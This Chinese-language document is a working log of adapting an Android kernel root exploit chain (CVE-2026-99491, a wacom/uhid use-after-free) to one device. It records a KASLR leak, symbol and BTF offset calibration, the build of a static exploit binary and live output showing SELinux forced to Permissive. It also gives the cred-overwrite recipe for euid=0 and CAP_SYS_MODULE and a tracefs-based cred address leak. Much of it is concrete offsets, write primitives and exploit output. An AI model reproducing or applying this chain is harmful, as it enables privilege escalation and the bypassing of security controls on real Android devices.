# CVE-2026-99491 适配记录（测试证据）

> 计划：`docs/99491-test-plan.md`。分支：`next-99491-realcred`。
> 本文件只记录**脱敏后的结论与关键证据**；原始 dump（kallsyms/BTF/boot.img/完整日志）
> 放在工作区外 `/root/workspace/_99491-calib/`，不提交进 git。

## 环境基线（S0）

| 项 | 值 |
|---|---|
| 设备 | lhasa / 2608BPX34C |
| 内核 | `6.18.21-android17-5-g805aa6adea19-abogki565292102-4k` |
| 内核构建 | `#1 SMP PREEMPT Wed Sep 23 09:23:45 UTC 2026` |
| SPL | `2026-10-01` |
| shell | uid 2000, `u:r:shell:s0`, Enforcing |
| boot_id（S1 时点） | `674a5392-31bd-4104-8cde-b08413ee3bb7` |

## S1 补丁状态与可达性

| 检查 | 方法 | 结果 | 结论 |
|---|---|---|---|
| 98499 OOB 读可达 | 6.18 索引（我们的 base-88 公式 2284/2285）真机只读 PoC | 已漏出内核堆指针 waitq.next；`worker.func` 待用 harness 复测（手机命令校验误拒自定义二进制） | ✅ 可达 |
| wacom 修复缺失 | ① 参考判据：kallsyms 无修复版 helper；② `wacom_remove_shared_data` 无 `synchronize_rcu`（boot 反汇编，待 harness 通道） | `/proc/kallsyms` 中**无** `wacom_report_touch_mute` → 与参考设备"未修补"判据一致 | ✅ 未修补（G1 通过） |
| `/dev/uhid` | `ls -l` + shell 写测试 | 666，shell 在 uhid 组 | ✅ 可达 |
| wacom 驱动 | `/sys/bus/hid/drivers/wacom`、`/sys/module/wacom` | 存在 | ✅ |
| `/dev/uinput` | `ls -l` | `crw-rw---- uhid:uhid`；shell 在 uhid 组(3011) → 可读写 | ✅ |
| tracefs | `rss_stat/trigger`、`trace_pipe_raw` 权限 | 已知 shell 可读写（reach_probe 历史 + 本次复核） | ✅ |
| KSU manager | `pm path me.weishu.kernelsu` | `/data/app/~~Ya-RdwCp4X_3TnoIBjj1rg==/me.weishu.kernelsu-…/base.apk` | ✅ 已安装 |
| 静态判据 | boot Image 反汇编 | boot 分区读取被手机命令校验拦截；暂以 kallsyms helper 缺失 + 98499 可达替代，boot 反汇编留待 harness 通道补 | ⚠️ 待补 |

## S2 KASLR anchor（98499）

| 运行 | waitq.next | worker.func | slide（worker.func − 0x10e7400000） | 判定 |
|---|---|---|---|---|
| #1 | `0xffffff8134211170`（旧索引；首次可达性验证） | 0（索引按旧布局，预期） | — | 泄漏面可达 |
| #2 | `0xffffff80108f1170`（uhid base 0xffffff80108f0000，16KB 对齐） | **0xffffffd168379ff4** | **0x10e7400000** | ✅ 与 kallsyms/slide 缓存完全一致 |
| #3 | 待 cold boot 复测（exp 内部同样打印 worker.func=0xffffffd168379ff4 slide=0x10e7400000） | ✅ | ✅ | |

替代交叉验证（本次已完成）：用 kallsyms 的 `uhid_device_add_worker` 运行地址 0xffffffd168379ff4 减缓存 slide 0x10e7400000
得到链接地址 **0xffffffc080f79ff4**，与上游 Lw5959 对 lhasa 的记录值逐位一致；`selinux_state`、
`prepare_creds+0x2c` 也分别与现有 profile 对上 → slide 缓存可信、符号换算链路成立。

## S3 符号/BTF 标定

| 项 | 结果 |
|---|---|
| boot.img 导出 | 被命令校验拦（`/dev/block` 路径）；改用 kallsyms+BTF 方案，boot 反汇编待 harness |
| kallsyms 关键符号 | ✅ 已抓（`kptr_restrict` 临时 0 后已恢复 2，验证读回 2） |
| BTF 导出 | ✅ `/sys/kernel/btf/vmlinux` 7,043,019 B（root `cp` 到 /sdcard） |
| 符号→链接地址 | ✅ 8 个符号已换算（见 profile）；3 个交叉校验全 PASS |
| BTF 结构偏移 | ✅ `btf_dump.py` 自写解析器；cred/input_dev/input_handle/uhid_device/rq/selinux_state 全部提取 |
| 与参考 profile 对比 | ✅ 除符号地址/release/ksud 路径外，几何与偏移**逐项相同**（pyb110 6.18.21） |
| KCFI 常量 | 沿用参考值 0xb87c5ccb / 0x76675260，标 verified=0，待链上验证 |

## S4 cred site（按需；real_cred 模式可可能不需要）

| 项 | 值 |
|---|---|
| 来源 | `prepare_creds+0x2c`（本机 prepare_creds=0xffffffc08026d188）|
| 计算 | `cred & 0x1fffff` = **446900 (0x6d1b4)**；real_cred 模式不走 tracefs cred 扫描，此项仅 trap 模式需要 |

## S5 分级写测试

**2026-11-25 22:52 首次 real_cred --no-ksu（当前开机，KSU 模块 Live）**
- exp 输出：`worker.func = 0xffffffd168379ff4 slide = 0x10e7400000` → KASLR/符号/profile 三向一致。
- 失败点：`oracle capture failed; deterministic reclaim` → `self cell install failed`（PARKED）。
- 安全性：`getenforce` 前后均 Enforcing；boot_id 未变（无 panic/重启）；未发生内核写（self cell 阶段前失败）。
- 归因：UAF 回收未命中（概率性），且当前开机有 KSU 模块 hook（`ksu_handle_input_handle_event`）干扰 input 路径；需 clean boot 重试。
- 下一步：重启到未越狱状态（清 PARKED 与 KSU hook）→ 跑 stage C full。

## S6 全链

## S7 三次冷启动

## 里程碑记录（2026-11-25）
- G1 补丁/可达性：**PASS**（未修补证据 2 项；uhid/uinput/wacom/tracefs/KSU 前置全满足）。
- G3 标定：**基本完成**（符号 8 项 + BTF 偏移 + 与参考 profile 逐项一致；KCFI 待验证）。
- 校准产物：`app/src/main/assets/lhasa_99491_profile.json`（verified=0，标定机读记录在 `calibration` 块）。
- 待办：S2 anchor 真机复测（需 harness 执行通道）、boot 反汇编补证、S5–S7、App 集成、CI。

## 结论
（链打通后填）

## 构建记录（2026-11-25 23:14）
- `python3 tools/99491/gen_profile.py --check --json app/src/main/assets/lhasa_99491_profile.json` → OK（112 字段，verified=0 WARN）
- `bash plant/99491/build.sh --self-test` → RC=0 / SELF_TEST_OK（kmi=android17-6.18 backend=asset ksud=/data/adb/ksud）
- 输入 JSON sha256：`ecf40bb8d4490804bbf15223dabdacfa793f41039d57ad9e9d61fda2f8caf0f9`（profile.h 头注释可追溯）
- 生成的 `plant/99491/profile.h` 文件 sha256：`fd86e3bc407f3233…`
- 产物 `build/99491/exp`：ELF aarch64 static stripped，800,696 B，sha256 `3623325a28366e9cfab14116cf1b449506bbbaa4f96e0757b27b4f6792021f97`
- 设备侧部署：`/sdcard/Download/DSH-Go/99491/exp_repo`（同 sha）；当前待测阶段 `--stage=write --no-ksu` + `CVE99491_CHAIN_DEBUG=1`

## 关键突破（2026-11-25 23:36）：pad 报告 → 回收 fake input_dev → 8 字节写 全通
`--stage=trigger`（clean boot c2c99590，Enforcing 进入）实测：
```
[step] trigger probe: enforce_before=1 vals_target=0xffffffec73f5962f selinux_state=0xffffffec73f59630
[dbg] pair-up evdev event11 name="wacom-pair-touch Finger" sw=0x4000 mute_bit=1
[dbg] pair-up evdev event12 name="wacom-pair-pad Pen"; event13 name="wacom-pair-pad Pad"
[+] oracle hit: target slot reclaimed by our skb (depth 64)
[dbg] trigger probe: enforce before=1 after=0
TRIGGER_PROBE_OK  → getenforce_after=Permissive
```
结论：
1. UAF 后 pad MUTE 报告**确实到达** `shared->touch_input` 悬垂指针并执行到被回收的 fake `input_dev`；
2. 5.15/XRING 式**direct-vals 固定词写原语在 lhasa 6.18.21 上可用**（本次把 EV_SW 词 `05 00 0e 00 V..` 写在 `selinux_state-1`，使 enforcing=0 并可观测）；
3. 因此不必修 Yunnijian 的 fake-handle 链；改用 XRING O1 家族已验证的“固定词直写”路线：
   - 已知可写词：EV_SW 词 `{05 00 0e 00 V 00 00 00}`（V=0/1，由 pad TOUCHONOFF 报告 `{02 03}`/`{02 02}` 选择）、以及 vals 指针 + num_vals 偏移可把词写到任意 `target = vals + 8k`；
   - cred 字段覆盖配方（XRING P3/P4，cred 布局与 lhasa BTF 完全一致）：`cred+0x14`（=值0词）→ sgid=0x000e0005、euid=0；`cred+0x3e`（=值1词）→ cap_permitted 高位 + cap_effective bit16(CAP_SYS_MODULE)；
   - permissive 窗口：直接写 `selinux_state-1`（enforcing=0）/ `selinux_state-2`（enforcing=0x0e 非零，恢复 Enforcing 语义）；
   - 仍需解决：cred 地址来源（kprobe 在本机 EBUSY，改用 5.15 的 tracefs kmem raw ring 泄漏）、以及 endgame（ksud late-load 而不是打补丁 .ko）。
4. 设备状态：本次运行后处于 Permissive + PARKED，必须重启恢复；无 panic、boot_id 未变。
5. 参考实现：ChaYeWuu/XRING-CVE-2026-99491（XRING O1 家族，docs/02-exploit-chain.md P0–P6、docs/05-pitfalls.md）已落地到 `/root/workspace/_xring/`。

## 2026-11-26 00:05 cred 地址泄漏成功（direct 引擎，leak-only）
6.18 的 `kmem_cache_alloc` tracepoint 字段布局与 5.15 参考不同（新增 `__string(name)`），
旧解析偏移全部错位。按 Linux 6.18 `include/trace/events/kmem.h` 重写后真机命中：
```
[dbg] credrec pid=28695 reqA=184 site=0xffffffed5ae6d1b4 ptr=0xffffff80481efa80
[+] cred leak candidate=0xffffff80481efa80
CRED_LEAK_ONLY_OK
```
- `reqA=184`（cred_jar object_size）唯一候选；
- `site` 低 21 位 = `0x6d1b4`，与 profile 里 `prepare_creds+0x2c` 的 `cred_site_low21` 完全一致
  （profile 标定的 call-site 偏移被真机证实）；
- 该阶段只读、无 UAF 写。下一步：`--stage=cred`（去掉 CRED_LEAK_ONLY）做 euid oracle 真写。

## 注：GitHub 备份检查点
- `e1aa201`（初次备份）→ 本次再提交：6.18 kmem 解析修复、leak-only 开关、README_direct、构建/恢复记录。
